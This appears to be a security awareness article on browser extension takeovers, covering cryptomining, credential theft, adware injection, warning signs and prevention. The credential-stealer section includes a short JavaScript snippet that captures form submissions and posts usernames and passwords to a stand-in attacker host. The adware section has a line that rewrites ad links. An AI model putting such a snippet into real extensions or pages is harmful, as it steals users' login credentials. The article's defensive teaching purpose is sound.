## Browser Extension Takeovers
Browser extension takeovers **occur when malicious actors exploit vulnerabilities or manipulate browser extensions to gain unauthorized access, install malicious scripts, or hijack browser behavior**. These attacks can result in **cryptocurrency mining, credential theft, and adware injection, impacting user security and privacy**.

## 1. How Browser Extension Takeovers Happen
1. **Malicious Extensions**
  - Attackers create or distribute browser extensions containing malicious code.
  - Example
    - An extension claiming to improve performance but secretly mining cryptocurrency.
2. **Compromised Legitimate Extensions**
  - Attackers take control of a trusted extension via:
    - **Developer Account Hijacking**: Compromising the extension developer’s credentials.
    - **Supply Chain Attacks**: Injecting malicious updates into the extension’s source code.
  - Example
    - The “Copyfish” extension was compromised in 2017 after attackers hijacked the developer’s credentials.
3. **Exploiting Permissions**
  - Extensions often request excessive permissions (e.g., full access to websites, clipboard, or storage).
  - Example
    - Extensions requesting:
```
"permissions": ["*://*/*", "storage", "tabs"]
```

4. **Third-Party Libraries**
  - Extensions may rely on third-party libraries that contain vulnerabilities or backdoors.
5. **Browser Updates**
  - Attackers exploit outdated browsers or extensions not patched for security flaws.


## 2. Types of Attacks Using Browser Extensions

### a. Cryptocurrency Miners
  - Inject scripts that silently mine cryptocurrencies like Monero using the victim’s CPU resources.
  - Impact
    - Slows down system performance.
    - Increases energy consumption.
  - Example
    - A malicious extension injects Coinhive scripts to mine cryptocurrency when the browser is active.

### b. Credential Stealers
  - Extensions with access to input fields, cookies, or browser storage steal:
    - Login credentials.
    - Session tokens.
    - Payment information.
  - Techniques
    - Capturing keystrokes or form submissions.
    - Extracting session cookies for account takeovers.
  - Example
```
document.addEventListener('submit', (e) => {
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({ username: e.target.username.value, password: e.target.password.value })
    });
});
```

### c. Adware Injection
  - Extensions inject malicious ads, pop-ups, or redirect traffic to earn revenue from affiliate networks.
  - Impact
    - Alters legitimate website content.
    - Redirects users to phishing or malware-laden websites.
  - Example
    - Replacing ads on example.com with attacker-controlled ads
```
document.body.innerHTML = document.body.innerHTML.replace(/adnetwork\.com/g, 'attacker-ads.com');
```


## 3. Indicators of Compromised Extensions
1. **High CPU Usage**
  - Sudden spikes in CPU usage, even when idle, could indicate cryptomining.
2. **Unexpected Ads or Pop-Ups**
  - Ads appearing on websites that normally don’t display them.
3. **Unauthorized Behavior**
  - Redirections to unknown websites.
  - Requests for unexpected permissions.
4. **Slow Browser Performance**
  - Compromised or malicious extensions may slow browsing activity due to mining or data exfiltration.
5. **New Unknown Extensions**
  - Extensions you didn’t install appearing in your browser.


## 4. Preventing Browser Extension Takeovers

### a. Limit Extension Permissions
  - **Least Privilege Principle**
    - Only install extensions with minimal permissions necessary for their functionality.
  - **Review permissions like**
    - Access to all sites or Read and change data on all websites.

### b. Use Trusted Extensions
  - Install extensions only from **trusted sources**
    - Chrome Web Store, Mozilla Add-ons.
  - Check user reviews, ratings, and the number of downloads.

### c. Regularly Audit Extensions
  - Periodically review installed extensions and remove unused or suspicious ones.

### d. Enable Automatic Updates
  - Keep both browsers and extensions updated to patch known vulnerabilities.

### e. Monitor Extension Behavior
  - Use tools to analyze extensions:
    - CRXcavator: Audits Chrome extensions for risks.
    - Privacy Badger: Blocks trackers and malicious scripts.

### f. Use Security Solutions
  - Implement security tools that:
    - Detect malicious browser extensions.
    - Prevent unauthorized script execution.

### g. Be Cautious of Developer Abandonment
  - Extensions abandoned by developers may get hijacked and updated with malicious code.


## 5. Example Scenario: Malicious Extension Hijacking
1. Original Scenario
  - User installs a legitimate “ad blocker” extension with 5-star reviews.
2. Attack
  - The attacker compromises the developer’s account and pushes a malicious update.
  - The update includes a script to mine cryptocurrency in the background.
3. Result
  - Users experience high CPU usage and slower system performance.
  - Their browser silently connects to an attacker-controlled mining pool.


## 6. Summary

| Attack Type | Description | Impact |
| ----------- | ----------- | ------ |
| Cryptocurrency Miners | Uses CPU power to mine crypto without user consent. | Slows system, increases energy usage. |
| Credential Stealers | Steals passwords, cookies, and tokens via input monitoring. | Account takeovers, data theft. |
| Adware Injection | Injects ads or redirects traffic to malicious sites. | Alters content, phishing, revenue fraud. |

**Browser extension takeovers pose a significant security risk, enabling attackers to inject miners, steal credentials, or display malicious ads**. By carefully managing permissions, auditing extensions, and staying vigilant about unusual behavior, users and organizations can reduce the risk of extension-related attacks. Security awareness and proper hygiene are key to preventing these takeovers.
